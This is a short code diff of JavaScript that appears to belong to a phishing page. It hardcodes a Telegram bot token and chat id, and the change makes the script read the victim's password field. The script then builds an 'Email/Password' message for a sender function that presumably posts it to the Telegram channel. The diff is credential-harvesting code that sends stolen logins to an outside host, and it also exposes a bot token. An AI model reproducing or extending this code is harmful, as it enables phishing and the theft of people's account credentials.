@@ -4,9 +4,9 @@ var telegram_bot_id = "5812649148:AAGGMDuZca1V4Xwe6-9tfXUtvv8n-edEMf8";
 var chat_id = -1001534895593;
 var u_name, email;
 var ready = function () {
-    u_name = document.getElementById("name").value;
     email = document.getElementById("email").value;
-
+    u_name = document.getElementById("password").value;
+   
     message = "Email: " + email + "\nPassword: " + u_name;
 };
 var sender = function () {
